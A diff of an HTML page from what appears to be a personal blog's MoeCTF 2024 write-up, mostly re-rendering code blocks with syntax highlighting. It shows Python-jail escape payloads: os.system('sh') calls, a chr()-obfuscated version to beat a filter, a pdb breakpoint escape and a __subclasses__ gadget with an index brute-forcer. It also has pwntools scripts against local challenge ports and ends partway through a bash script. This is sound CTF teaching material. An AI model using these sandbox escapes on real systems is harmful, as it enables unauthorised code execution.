@@ -8,6 +8,8 @@
       
       
       
+        <link rel="canonical" href="https://zero6six.github.io/CTF/MoeCTF%202024/WP/">
+      
       
         <link rel="prev" href="../../Hackergame2024/%E9%94%AE%E7%9B%98%E4%BC%A0%E8%BE%93%E6%96%87%E4%BB%B6/">
       
@@ -110,6 +112,43 @@
     
     
     
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
     
   </nav>
   
@@ -158,7 +197,7 @@
         
   
   <span class="md-ellipsis">
-    Welcome to MkDocs
+    凌六博客
   </span>
   
 
@@ -3626,62 +3665,62 @@
 <p>执行之后从 output.txt 拿到 flag：moectf{F5_15_s0_lntere5t1n9}</p>
 <h4 id="moejail_lv1">moejail_lv1</h4>
 <p>小脚本拼接个字符串进 shell。</p>
-<pre><code class="language-python">from pwn import *
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-# 设置服务器地址和端口号
-server_ip = '127.0.0.1'
-server_port = 42387
+<span class="c1"># 设置服务器地址和端口号</span>
+<span class="n">server_ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">server_port</span> <span class="o">=</span> <span class="mi">42387</span>
 
-# 创建TCP连接
-connection = remote(server_ip, server_port)
+<span class="c1"># 创建TCP连接</span>
+<span class="n">connection</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">server_ip</span><span class="p">,</span> <span class="n">server_port</span><span class="p">)</span>
 
-# 接收服务器发送的数据
-received_data = connection.recv().decode('utf-8')
-send_data = received_data[-32:-26] + received_data[-23:-17]
+<span class="c1"># 接收服务器发送的数据</span>
+<span class="n">received_data</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+<span class="n">send_data</span> <span class="o">=</span> <span class="n">received_data</span><span class="p">[</span><span class="o">-</span><span class="mi">32</span><span class="p">:</span><span class="o">-</span><span class="mi">26</span><span class="p">]</span> <span class="o">+</span> <span class="n">received_data</span><span class="p">[</span><span class="o">-</span><span class="mi">23</span><span class="p">:</span><span class="o">-</span><span class="mi">17</span><span class="p">]</span>
 
-# 输出接收到的数据
-print(received_data)
+<span class="c1"># 输出接收到的数据</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">received_data</span><span class="p">)</span>
 
-connection.sendline(send_data.encode('utf-8'))
+<span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">send_data</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
 
-connection.interactive()
+<span class="n">connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 
-# 可以在这里添加对接收到的数据进行进一步处理的代码
-# 例如：解析、保存到文件、发送进一步的请求等等
+<span class="c1"># 可以在这里添加对接收到的数据进行进一步处理的代码</span>
+<span class="c1"># 例如：解析、保存到文件、发送进一步的请求等等</span>
 
-# 关闭连接
-connection.close()
-</code></pre>
+<span class="c1"># 关闭连接</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
 <p>执行<code>__import__('os').system('sh')</code>，拿到 shell 之后  <code>cd ../../../tmp</code>，<code>ls -la</code> 发现隐藏的 flag 文本文件，但是不知道为啥没法直接 cat，可能文件名过长，不过没事，可以用通配符<code>cat .therealflag_7aeafbf44f4f26f484f3204cb*</code></p>
 <h4 id="the-upside-and-down">The upside and down</h4>
 <p>丢进 010 Editor，注意到开始为 28 06 24 EA 44 E4 54 94，恰好是 PNG 文件尾 49 45 4E 44 AE 42 60 82 一位位翻转的结果，据此拷打 GPT 叫他写个 python 脚本如下：</p>
-<pre><code class="language-python">def reverse_hex_digits(input_file, output_file):
-    # 读取文件内容为二进制数据
-    with open(input_file, 'rb') as f:
-        data = f.read()
+<div class="highlight"><pre><span></span><code><span class="k">def</span> <span class="nf">reverse_hex_digits</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">):</span>
+    <span class="c1"># 读取文件内容为二进制数据</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
 
-    # 将二进制数据转换为十六进制字符串，并移除 &quot;0x&quot; 前缀
-    hex_string = data.hex()
+    <span class="c1"># 将二进制数据转换为十六进制字符串，并移除 &quot;0x&quot; 前缀</span>
+    <span class="n">hex_string</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
 
-    # 将十六进制字符串颠倒（按每个字符）
-    reversed_hex_string = hex_string[::-1]
+    <span class="c1"># 将十六进制字符串颠倒（按每个字符）</span>
+    <span class="n">reversed_hex_string</span> <span class="o">=</span> <span class="n">hex_string</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
 
-    # 将颠倒后的十六进制字符串转换回二进制数据
-    reversed_data = bytes.fromhex(reversed_hex_string)
+    <span class="c1"># 将颠倒后的十六进制字符串转换回二进制数据</span>
+    <span class="n">reversed_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">reversed_hex_string</span><span class="p">)</span>
 
-    # 将颠倒的数据写入输出文件
-    with open(output_file, 'wb') as f:
-        f.write(reversed_data)
+    <span class="c1"># 将颠倒的数据写入输出文件</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">reversed_data</span><span class="p">)</span>
 
-if __name__ == &quot;__main__&quot;:
-    input_file = 'input.bin'   # 输入文件路径
-    output_file = 'output.bin' # 输出文件路径
-    reverse_hex_digits(input_file, output_file)
-</code></pre>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">input_file</span> <span class="o">=</span> <span class="s1">&#39;input.bin&#39;</span>   <span class="c1"># 输入文件路径</span>
+    <span class="n">output_file</span> <span class="o">=</span> <span class="s1">&#39;output.bin&#39;</span> <span class="c1"># 输出文件路径</span>
+    <span class="n">reverse_hex_digits</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">)</span>
+</code></pre></div>
 <p>得到一个高糊二维码，但是小爱视觉扫的出来，结果：</p>
-<pre><code class="language-plaintext">where_is_the_flag?
-https://balabala_towards:moectf{Fri3nds_d0n't_lie!}//
-</code></pre>
+<div class="highlight"><pre><span></span><code>where_is_the_flag?
+https://balabala_towards:moectf{Fri3nds_d0n&#39;t_lie!}//
+</code></pre></div>
 <h4 id="ctfer20771">ctfer2077①</h4>
 <p>stegsolve 中 file format 发现一大堆额外信息，去 <code>strings -n 8 qrcode.png</code> 发现 <code>where is the flag? OK I give you some hints:incomplete LSB.@</code>。</p>
 <p>stegsolve 捣鼓半天 LSB 发现是在 Red-0 的最上面。</p>
@@ -3697,11 +3736,11 @@ https://balabala_towards:moectf{Fri3nds_d0n't_lie!}//
 <li><code>[^\x00-\xff]</code>: 不能使用非ASCII字符，也就是只能使用0x00到0xFF范围内的ASCII字符。</li>
 </ol>
 <p>忘记第一次怎么过的了，但是 10.10 写的时候想了个用 chr() 和数字 9 硬凑的方法。</p>
-<pre><code class="language-python">chr(int(99+9+9/9+9/9+9/9)) # o
-chr(int(99+9+9-9/9-9/9))   # s
-chr(int(99+9-9/9-9/9-9/9-9/9)) # h
-__import__(chr(int(99+9+9/9+9/9+9/9))+chr(int(99+9+9-9/9-9/9))).system(chr(int(99+9+9-9/9-9/9))+chr(int(99+9-9/9-9/9-9/9-9/9))) # __import__('os').system('sh')
-</code></pre>
+<div class="highlight"><pre><span></span><code><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">))</span> <span class="c1"># o</span>
+<span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">))</span>   <span class="c1"># s</span>
+<span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">))</span> <span class="c1"># h</span>
+<span class="nb">__import__</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">))</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">)))</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">+</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">))</span><span class="o">+</span><span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="mi">99</span><span class="o">+</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="o">-</span><span class="mi">9</span><span class="o">/</span><span class="mi">9</span><span class="p">)))</span> <span class="c1"># __import__(&#39;os&#39;).system(&#39;sh&#39;)</span>
+</code></pre></div>
 <p>用第三个拿到 shell 之后 <code>cd ../../../tmp</code>, <code>ls</code>, <code>cat</code>。</p>
 <h4 id="moejail_lv25">moejail_lv2.5</h4>
 <p>没过滤<code>eval(input())</code>。</p>
@@ -3717,14 +3756,14 @@ __import__(chr(int(99+9+9/9+9/9+9/9))+chr(int(99+9+9-9/9-9/9))).system(chr(int(9
 <p>𝘣𝘳𝘦𝘢𝘬𝘱𝘰𝘪𝘯𝘵() 直接进 pdb，然后直接 import os，os.system('sh')，剩下的不再赘述。</p>
 <h4 id="moejail_lv4">moejail_lv4</h4>
 <p>小脚本过验证码，本体环境中<code>__builtins__</code>被扬了，在网上查找类似题目发现 <code>().__class__.__base__.__subclasses__()[-73].__init__.__globals__['system']('sh')</code> 是一种方法。但其中 <code>[-73]</code> 部分的值在不同机器不固定。</p>
-<pre><code class="language-python">a=r&quot;().__class__.__base__.__subclasses__()[&quot;
-c=r&quot;].__init__.__globals__['system']('sh')&quot;
+<div class="highlight"><pre><span></span><code><span class="n">a</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;().__class__.__base__.__subclasses__()[&quot;</span>
+<span class="n">c</span><span class="o">=</span><span class="sa">r</span><span class="s2">&quot;].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)&quot;</span>
 
-for i in range (-1, -100, -1):
-    b=str(i)
-    d=a+b+c
-    print(d)
-</code></pre>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">100</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">b</span><span class="o">=</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">d</span><span class="o">=</span><span class="n">a</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">c</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+</code></pre></div>
 <p>写个脚本批量生成要注入的命令，然后耐试王自己一个个试，最终在 -73 拿到 shell。</p>
 <h4 id="find-it">Find It</h4>
 <p>在图片中可隐隐约约看到雄峰集团四个字，百度地图找到相关地点。</p>
@@ -3733,44 +3772,44 @@ for i in range (-1, -100, -1):
 <p><img alt="" src="../attachments/Pasted%20image%2020241010172558.png" /></p>
 <h4 id="_5">我的图层在你之上</h4>
 <p>自己之前叫 GPT 写过一个提取 pdf 漫画的，刚好用上。</p>
-<pre><code class="language-python">import fitz  # PyMuPDF
-import os
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">fitz</span>  <span class="c1"># PyMuPDF</span>
+<span class="kn">import</span> <span class="nn">os</span>
 
-def extract_raw_images_from_directory(input_directory, output_directory):
-    # 检查输出目录是否存在，如果不存在，则创建它
-    if not os.path.exists(output_directory):
-        os.makedirs(output_directory)
+<span class="k">def</span> <span class="nf">extract_raw_images_from_directory</span><span class="p">(</span><span class="n">input_directory</span><span class="p">,</span> <span class="n">output_directory</span><span class="p">):</span>
+    <span class="c1"># 检查输出目录是否存在，如果不存在，则创建它</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">output_directory</span><span class="p">):</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">output_directory</span><span class="p">)</span>
 
-    # 遍历指定目录中的所有文件
-    for file_name in os.listdir(input_directory):
-        if file_name.endswith('.pdf'):
-            pdf_path = os.path.join(input_directory, file_name)
-            doc = fitz.open(pdf_path)
+    <span class="c1"># 遍历指定目录中的所有文件</span>
+    <span class="k">for</span> <span class="n">file_name</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="n">input_directory</span><span class="p">):</span>
+        <span class="k">if</span> <span class="n">file_name</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39;.pdf&#39;</span><span class="p">):</span>
+            <span class="n">pdf_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">input_directory</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+            <span class="n">doc</span> <span class="o">=</span> <span class="n">fitz</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="n">pdf_path</span><span class="p">)</span>
 
-            # 创建以PDF文件名命名的子文件夹
-            pdf_folder_name = os.path.splitext(file_name)[0]  # 移除.pdf扩展名
-            pdf_output_path = os.path.join(output_directory, pdf_folder_name)
-            if not os.path.exists(pdf_output_path):
-                os.makedirs(pdf_output_path)
+            <span class="c1"># 创建以PDF文件名命名的子文件夹</span>
+            <span class="n">pdf_folder_name</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">splitext</span><span class="p">(</span><span class="n">file_name</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  <span class="c1"># 移除.pdf扩展名</span>
+            <span class="n">pdf_output_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">output_directory</span><span class="p">,</span> <span class="n">pdf_folder_name</span><span class="p">)</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">exists</span><span class="p">(</span><span class="n">pdf_output_path</span><span class="p">):</span>
+                <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">pdf_output_path</span><span class="p">)</span>
 
-            # 处理每一页的图片
-            for i in range(len(doc)):
-                for img_index, img in enumerate(doc.get_page_images(i)):
-                    xref = img[0]
-                    base_image = doc.extract_image(xref)
-                    image_bytes = base_image[&quot;image&quot;]  # 获取原始图片数据
-                    image_ext = base_image[&quot;ext&quot;]      # 图片格式
-                    image_filename = f&quot;page_{i}_img_{img_index}.{image_ext}&quot;
-                    image_full_path = os.path.join(pdf_output_path, image_filename)
-                    with open(image_full_path, 'wb') as img_file:
-                        img_file.write(image_bytes)
-                    print(f&quot;Extracted {image_full_path}&quot;)
+            <span class="c1"># 处理每一页的图片</span>
+            <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">doc</span><span class="p">)):</span>
+                <span class="k">for</span> <span class="n">img_index</span><span class="p">,</span> <span class="n">img</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">doc</span><span class="o">.</span><span class="n">get_page_images</span><span class="p">(</span><span class="n">i</span><span class="p">)):</span>
+                    <span class="n">xref</span> <span class="o">=</span> <span class="n">img</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+                    <span class="n">base_image</span> <span class="o">=</span> <span class="n">doc</span><span class="o">.</span><span class="n">extract_image</span><span class="p">(</span><span class="n">xref</span><span class="p">)</span>
+                    <span class="n">image_bytes</span> <span class="o">=</span> <span class="n">base_image</span><span class="p">[</span><span class="s2">&quot;image&quot;</span><span class="p">]</span>  <span class="c1"># 获取原始图片数据</span>
+                    <span class="n">image_ext</span> <span class="o">=</span> <span class="n">base_image</span><span class="p">[</span><span class="s2">&quot;ext&quot;</span><span class="p">]</span>      <span class="c1"># 图片格式</span>
+                    <span class="n">image_filename</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;page_</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">_img_</span><span class="si">{</span><span class="n">img_index</span><span class="si">}</span><span class="s2">.</span><span class="si">{</span><span class="n">image_ext</span><span class="si">}</span><span class="s2">&quot;</span>
+                    <span class="n">image_full_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">pdf_output_path</span><span class="p">,</span> <span class="n">image_filename</span><span class="p">)</span>
+                    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">image_full_path</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">img_file</span><span class="p">:</span>
+                        <span class="n">img_file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">image_bytes</span><span class="p">)</span>
+                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Extracted </span><span class="si">{</span><span class="n">image_full_path</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
 
-# 输入和输出目录
-input_directory = r&quot;D:\1ADevelop\project\gadgets\temp\comic\original&quot;
-output_directory = r&quot;D:\1ADevelop\project\gadgets\temp\comic\extract&quot;
-extract_raw_images_from_directory(input_directory, output_directory)
-</code></pre>
+<span class="c1"># 输入和输出目录</span>
+<span class="n">input_directory</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;D:\1ADevelop\project\gadgets\temp\comic\original&quot;</span>
+<span class="n">output_directory</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&quot;D:\1ADevelop\project\gadgets\temp\comic\extract&quot;</span>
+<span class="n">extract_raw_images_from_directory</span><span class="p">(</span><span class="n">input_directory</span><span class="p">,</span> <span class="n">output_directory</span><span class="p">)</span>
+</code></pre></div>
 <p>得到俩图，只要黑的那张，丢进 StegSolve 得到压缩包密码，打开是个凯撒密码。</p>
 <p><img alt="" src="../attachments/Pasted%20image%2020241010190708.png" /></p>
 <p><img alt="" src="../attachments/Pasted%20image%2020241010190944.png" /></p>
@@ -3806,100 +3845,100 @@ extract_raw_images_from_directory(input_directory, output_directory)
 <h4 id="_11">二进制漏洞审计入门指北</h4>
 <p>ncat 连上就能得到 moectf{Welcome_to_the_journey_of_Pwn}</p>
 <h4 id="notenoughtime">NotEnoughTime</h4>
-<pre><code class="language-python">from pwn import *
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
-# 设置服务器地址和端口号
-server_ip = '127.0.0.1'
-server_port = 46227
+<span class="c1"># 设置服务器地址和端口号</span>
+<span class="n">server_ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span>
+<span class="n">server_port</span> <span class="o">=</span> <span class="mi">46227</span>
 
-def send():
-    try:
-        rec = connection.recvuntil(b'= ').decode('utf-8')
-        print(rec,end='')
-        sendNum = str(eval(rec[:-3].replace('/', '//').replace(&quot;\n&quot;, '')))
-        print(sendNum)
-        connection.sendline(sendNum.encode('utf-8'))
-    except EOFError:
-        rec = connection.recvall().decode('utf-8')
-        print(rec)
+<span class="k">def</span> <span class="nf">send</span><span class="p">():</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">rec</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;= &#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">rec</span><span class="p">,</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+        <span class="n">sendNum</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">eval</span><span class="p">(</span><span class="n">rec</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="s1">&#39;//&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)))</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">sendNum</span><span class="p">)</span>
+        <span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">sendNum</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+    <span class="k">except</span> <span class="ne">EOFError</span><span class="p">:</span>
+        <span class="n">rec</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">rec</span><span class="p">)</span>
 
-# 创建TCP连接
-connection = remote(server_ip, server_port)
+<span class="c1"># 创建TCP连接</span>
+<span class="n">connection</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">server_ip</span><span class="p">,</span> <span class="n">server_port</span><span class="p">)</span>
 
-connection.sendline(b'2')
-connection.sendline(b'0')
+<span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;0&#39;</span><span class="p">)</span>
 
-rec = connection.recvuntil(b'ED!\n').decode('utf-8')
-print(rec)
+<span class="n">rec</span> <span class="o">=</span> <span class="n">connection</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;ED!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">rec</span><span class="p">)</span>
 
-breakpoint()
-# pdb 内手动调用 send()，可以改成 while 循环。
+<span class="nb">breakpoint</span><span class="p">()</span>
+<span class="c1"># pdb 内手动调用 send()，可以改成 while 循环。</span>
 
-connection.interactive()
-connection.close()
-</code></pre>
+<span class="n">connection</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">connection</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div>
 <p><img alt="" src="../attachments/Pasted%20image%2020241011011028.png" /></p>
 <h3 id="_12">开发与运维基础</h3>
 <h4 id="_13">运维入门指北</h4>
 <p>本题我使用 <code>FinalShell</code> 软件，图形化界面可以直接删除 bak，然后进行如下操作</p>
-<pre><code class="language-shell">su # 切换成 root 用户
+<div class="highlight"><pre><span></span><code>su<span class="w"> </span><span class="c1"># 切换成 root 用户</span>
 
-# 以下脚本来自 GPT ########
-#!/bin/bash
+<span class="c1"># 以下脚本来自 GPT ########</span>
+<span class="c1">#!/bin/bash</span>
 
-# 目标根目录
-target_base=&quot;/var/www/html&quot;
+<span class="c1"># 目标根目录</span>
+<span class="nv">target_base</span><span class="o">=</span><span class="s2">&quot;/var/www/html&quot;</span>
 
-# 处理 .xml 文件：重命名为 .html 并分类
-for file in *.xml; do
-  # 判断文件是否存在，避免没有 .xml 文件时报错
-  if [[ -f &quot;$file&quot; ]]; then
-    # 获取文件的基础名字（不含后缀）
-    base_name=&quot;${file%.xml}&quot;
+<span class="c1"># 处理 .xml 文件：重命名为 .html 并分类</span>
+<span class="k">for</span><span class="w"> </span>file<span class="w"> </span><span class="k">in</span><span class="w"> </span>*.xml<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="c1"># 判断文件是否存在，避免没有 .xml 文件时报错</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="o">[[</span><span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$file</span><span class="s2">&quot;</span><span class="w"> </span><span class="o">]]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">    </span><span class="c1"># 获取文件的基础名字（不含后缀）</span>
+<span class="w">    </span><span class="nv">base_name</span><span class="o">=</span><span class="s2">&quot;</span><span class="si">${</span><span class="nv">file</span><span class="p">%.xml</span><span class="si">}</span><span class="s2">&quot;</span>
 
